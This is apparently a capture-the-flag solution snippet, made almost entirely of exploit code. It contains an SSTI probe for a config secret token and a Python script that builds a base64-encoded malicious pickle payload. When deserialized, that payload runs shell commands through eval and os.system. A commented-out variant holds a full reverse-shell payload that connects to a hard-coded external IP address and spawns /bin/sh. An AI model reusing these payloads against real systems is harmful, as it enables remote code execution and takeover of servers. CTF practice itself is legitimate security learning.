# Take Your Flag 04

```py
{config.secret_token}

import base64

print(
    base64.b64encode(b"""cbuiltins
__getattribute__
(S'eval'
tR(S'__import__("os").system("mkdir static&&/readflag>static/flag.txt")'
tR.
""")
)

# print(
#     base64.b64encode(b"""cbuiltins
# __getattribute__
# (S'exec'
# tR(S'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.116.190.87",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# tR.
# """)
# )

```
